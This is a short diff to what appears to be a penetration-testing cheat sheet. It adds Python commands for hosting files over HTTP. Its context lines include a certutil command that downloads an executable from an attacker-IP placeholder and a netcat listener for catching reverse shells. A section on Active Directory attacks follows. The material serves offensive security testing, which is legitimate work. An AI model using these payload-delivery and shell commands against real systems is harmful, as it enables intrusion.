@@ -101,7 +101,9 @@ certutil.exe -urlcache -f http://[attackerip]:8000/[application.exe] [applicatio
 nc -nlvp [port]
 
 ## Directory hosting
-python -m SimpleHTTPServer
+python2 - python -m SimpleHTTPServer
+
+python3 - python3 -m http.server 8080
 
 ## Active Directory Attacks  
 
